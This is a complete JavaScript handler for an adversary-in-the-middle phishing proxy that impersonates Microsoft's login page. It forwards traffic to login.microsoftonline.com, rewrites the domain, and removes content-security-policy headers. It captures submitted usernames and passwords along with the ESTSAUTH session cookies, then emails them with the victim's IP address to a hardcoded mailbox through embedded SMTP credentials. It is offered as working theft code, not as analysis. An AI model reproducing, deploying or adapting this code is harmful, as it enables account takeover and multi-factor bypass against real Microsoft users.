import nodemailer from 'nodemailer';

const smtpHost = 'mail.mailo.com';
const smtpPort = 587;
const smtpUser = 'coinreport@mailo.com';
const smtpPassword = 'sagekidayo';

const upstream = 'login.microsoftonline.com';
const upstream_path = '/';
const https = true;

export default async (req, res) => {
    const { method } = req;
    const region = (req.headers['cf-ipcountry'] || '').toUpperCase();
    const ip_address = req.headers['cf-connecting-ip'];

    if (method === 'POST') {
        try {
            const body = await new Promise((resolve, reject) => {
                let data = '';
                req.on('data', chunk => { data += chunk; });
                req.on('end', () => resolve(data));
                req.on('error', err => reject(err));
            });

            const keyValuePairs = new URLSearchParams(body);
            let message = "Password found:\n\n";

            for (const [key, value] of keyValuePairs) {
                if (key === 'login') {
                    const username = decodeURIComponent(value.replace(/\+/g, ' '));
                    message += `User: ${username}\n`;
                }
                if (key === 'passwd') {
                    const password = decodeURIComponent(value.replace(/\+/g, ' '));
                    message += `Password: ${password}\n`;
                }
            }

            if (message.includes("User") && message.includes("Password")) {
                await sendToServer(message, ip_address);
            }
        } catch (error) {
            console.error('Error processing POST request:', error);
            res.status(500).json({ error: 'Internal Server Error' });
            return;
        }
    }

    try {
        const urlParam = req.query.url;
        if (!urlParam) {
            throw new Error('No URL parameter provided');
        }

        const url = new URL(urlParam);
        url.host = upstream;
        url.protocol = https ? 'https:' : 'http:';
        url.pathname = url.pathname === '/' ? upstream_path : upstream_path + url.pathname;

        const fetchOptions = {
            method,
            headers: { ...req.headers, Host: upstream, Referer: `${url.protocol}//${req.headers.host}` }
        };

        const original_response = await fetch(url.href, fetchOptions);
        const original_response_clone = original_response.clone();
        const original_text = await replace_response_text(original_response_clone, upstream, req.headers.host);

        const cookies = original_response.headers.get('set-cookie');
        let all_cookies = "";
        if (cookies) {
            all_cookies = cookies.split(',').map(cookie => cookie.trim()).join('; \n\n');
        }

        if (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) {
            await sendToServer("Cookies found:\n\n" + all_cookies, ip_address);
        }

        res.status(original_response.status)
            .set({
                ...original_response.headers.raw(),
                'access-control-allow-origin': '*',
                'access-control-allow-credentials': true,
                'content-security-policy': undefined,
                'content-security-policy-report-only': undefined,
                'clear-site-data': undefined
            })
            .send(original_text);

    } catch (error) {
        console.error('Error fetching upstream:', error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
};

async function replace_response_text(response, upstream_domain, host_name) {
    try {
        let text = await response.text();
        let re = new RegExp(upstream_domain, 'g');
        text = text.replace(re, host_name);
        return text;
    } catch (error) {
        console.error('Error replacing response text:', error);
        throw error;
    }
}

async function sendToServer(data, ip_address) {
    try {
        let transporter = nodemailer.createTransport({
            host: smtpHost,
            port: smtpPort,
            secure: false,
            auth: {
                user: smtpUser,
                pass: smtpPassword
            }
        });

        await transporter.sendMail({
            from: `"Server" <${smtpUser}>`,
            to: smtpUser,
            subject: "New Data",
            text: `${data}\n\nIP Address: ${ip_address}`
        });
    } catch (error) {
        console.error('Error sending data via email:', error);
    }
}
